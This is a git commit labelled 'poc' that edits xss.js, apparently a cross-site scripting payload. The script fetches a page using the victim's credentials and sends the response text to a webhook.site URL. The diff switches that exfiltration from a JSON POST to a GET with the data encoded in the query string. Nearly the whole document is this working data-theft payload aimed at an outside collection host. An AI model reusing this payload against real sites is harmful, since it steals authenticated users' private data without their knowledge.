3255ca7aa8ec63e60bdad1e434f096bef7413ad4
fernando <fernando_bortotti@hotmail.com>
2025-02-14 15:09:56 -0300

    poc

--- xss.js
+++ xss.js
@@ -5,13 +5,13 @@ xhr.withCredentials = true;
 xhr.onreadystatechange = function() {
     if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
         var response = xhr.responseText;
-        
-        // Enviar os dados para o webhook
+        var encodedResponse = encodeURIComponent(response);
+        var webhookUrl = 'https://webhook.site/8e44c277-8cff-4bf6-96bf-e330244737d4?data=' + encodedResponse;
         var exfiltrateXhr = new XMLHttpRequest();
-        exfiltrateXhr.open('POST', 'https://webhook.site/8e44c277-8cff-4bf6-96bf-e330244737d4', true);
-        exfiltrateXhr.setRequestHeader('Content-Type', 'application/json');
-        exfiltrateXhr.send(JSON.stringify({ data: response }));
+        exfiltrateXhr.open('GET', webhookUrl, true);
+        exfiltrateXhr.send();
     }
 };
 
 xhr.send();
+
